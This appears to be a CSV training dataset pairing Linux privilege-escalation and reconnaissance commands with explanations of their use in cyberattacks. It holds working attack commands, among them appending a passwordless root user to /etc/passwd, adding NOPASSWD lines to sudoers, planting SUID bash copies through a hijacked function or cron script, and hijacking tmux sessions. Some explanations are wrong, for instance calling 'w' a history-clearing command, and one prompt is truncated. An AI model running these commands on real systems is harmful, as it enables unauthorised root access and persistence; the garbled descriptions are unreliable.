prompt,response
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody,"This command can be used to find files owned by the user or writable by anybody, which can be useful for privilege escalation or data exfiltration. It will search the entire file system, excluding the /proc/ directory and the user's home directory, and output a sorted list of unique results."
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user,"Potential use in a cyberattack: Finding files that can be modified by any group of the user can help an attacker escalate privileges or modify sensitive data.

What it does on a Linux machine: It searches for files or directories that are writable by any group of the user and excludes any files in the /proc/ directory or the user's home directory."
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd,"This command adds a new user 'dummy' to the system with root privileges, which can be used for persistence or privilege escalation in a cyberattack."
"python2 -c 'import crypt; print crypt.crypt(""hacker""","This command can be used to generate a hashed password for the user ""hacker"" and can be used in a brute force attack to crack passwords on a Linux machine."
openssl passwd -1 -salt hacker hacker,"This command can be used to generate a hashed password for the user ""hacker"" with the salt ""hacker"" using the MD5 algorithm. It can be used in a cyberattack to create a new user with a known password or to change the password of an existing user."
mkpasswd -m SHA-512 hacker,"This command can be used to generate a SHA-512 hashed password for the user ""hacker"" which can be used for privilege escalation or persistence on a compromised Linux machine."
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null,This command can be used to find all users that do not have a password set and can be used to gain access to the system without needing to crack a password.
ls -l /etc/profile /etc/profile.d/,"This command lists the permissions and ownership of the files /etc/profile and /etc/profile.d/, which could be useful for an attacker to identify potential configuration files to modify or exploit."
tmux -S /tmp/dev_sess attach -t 0,"This command can be used to attach to an existing tmux session with the specified socket file and session ID, potentially allowing an attacker to gain access to a victim's active terminal sessions and execute commands within them."
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null,"This command retrieves and displays the Access Control Lists (ACLs) for the specified directories and their contents, which could be useful for identifying potential targets or sensitive files for further exploitation."
"echo ""$(whoami) ALL=(ALL) NOPASSWD: ALL"" >> /etc/sudoers","This command adds the current user to the sudoers file, allowing them to execute commands with root privileges without entering a password, which could be useful for privilege escalation during a cyberattack."
"echo ""$(whoami) ALL=(ALL) NOPASSWD: ALL"" >> /etc/sudoers.d/README","This command adds the current user to the sudoers list, allowing them to execute commands with root privileges without entering a password, which could be useful for privilege escalation during a cyberattack."
"strace <SUID-BINARY> 2>&1 | grep -i -E ""open|access|no such file""","This command can be used to trace system calls made by a SUID binary and filter for any attempts to open or access files, including those that do not exist. It can be used to identify potential vulnerabilities or misconfigurations in file permissions."
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; },"This command creates a function that copies the bash shell to the /tmp directory, sets the setuid bit on the copied shell, and then executes the copied shell with privilege escalation, potentially allowing an attacker to gain root access to the system."
id || (whoami && groups) 2>/dev/null,"This command can be used to gather information about the current user and their group memberships, which can be useful for privilege escalation or lateral movement in a cyberattack. It will display the user ID, username, and group memberships of the current user, and any errors will be redirected to /dev/null."
"awk -F: '($3 == ""0"") {print}' /etc/passwd","This command can be used to identify all the users with UID 0 (root) on a Linux machine, which can be useful for privilege escalation in a cyberattack."
w,"Potential use in a cyberattack: Hiding malicious activity by clearing the terminal history.
What it does on a Linux machine: Clears the terminal history."
last | tail,"Displays the last few login records of users on the system, which can be useful for identifying active users and their login times for further reconnaissance or privilege escalation."
"for i in $(cut -d"":"" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort","This command can be used to enumerate all users on a Linux machine and their group memberships, which can be useful for privilege escalation or lateral movement in a cyberattack."
gpg --list-keys 2>/dev/null,"This command lists GPG keys and redirects any error messages to /dev/null, potentially used to hide the presence of GPG keys on a compromised machine."
"(netstat -punta || ss --ntpu) | grep ""127.0""",This command can be used to check for any suspicious network connections to the local machine and filter out any connections that are not originating from the machine itself.
"(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v ""^#"" | grep -Pv ""\W*\#"" 2>/dev/null)","This command can be used to check the firewall rules and configurations on a Linux machine, which can be useful for an attacker to identify potential vulnerabilities or misconfigurations that can be exploited."
(arp -e || arp -a),"Displays the ARP cache table, which can be used to gather information about the network and potentially identify other devices on the network."
(route || ip n),"Displays or manipulates the kernel's IP routing table, which can be useful for an attacker to determine network topology and identify potential targets or pivot points."
"for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v ""\["" | sed '/^.\{200\}./d' | sort | grep -E -v ""\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]""; rm /tmp/monprocs.tmp;","Potential use: Monitoring and profiling system processes to identify potential targets for exploitation.
What it does: Runs the 'ps' command 610 times, capturing the output to a temporary file, then sorts and counts the unique processes, filtering out any with long command lines or high process IDs, before deleting the temporary file."
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>,"This command adds a cron job that copies the bash binary to /tmp and sets the SUID bit, allowing an attacker to execute commands with elevated privileges."
